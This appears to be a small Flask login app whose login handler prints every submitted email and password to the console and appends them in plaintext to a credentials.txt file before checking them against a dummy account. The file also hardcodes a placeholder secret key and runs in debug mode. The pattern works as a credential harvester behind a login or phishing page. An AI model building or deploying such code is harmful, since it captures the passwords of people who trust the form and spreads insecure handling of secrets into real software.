from flask import Flask, render_template, request, flash, redirect, url_for

app = Flask(__name__, template_folder="../templates")  # Adjust path as needed
app.secret_key = 'your_secret_key'

DUMMY_USER = {
    "email": "ha",
    "password": "ha"
}

@app.route("/")
def home():
    return redirect(url_for('login'))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        # Debugging: print to console to verify data
        print(f"Received email: {email} and password: {password}")

        # Alternative file-writing method: using 'with' statement
        try:
            with open("./credentials.txt", "a") as file:
                file.write(f"Email: {email}, Password: {password}\n")
            print("Credentials written to credentials.txt")
        except Exception as e:
            print(f"Error writing to file: {e}")

        # Validate login credentials
        if email == DUMMY_USER["email"] and password == DUMMY_USER["password"]:
            flash("Login successful!", "success")
            return redirect(url_for("home"))
        else:
            flash("Invalid email or password. Please try again.", "error")
            return redirect(url_for("login"))

    return render_template("index.html")


if __name__ == "__main__":
    app.run(debug=True)
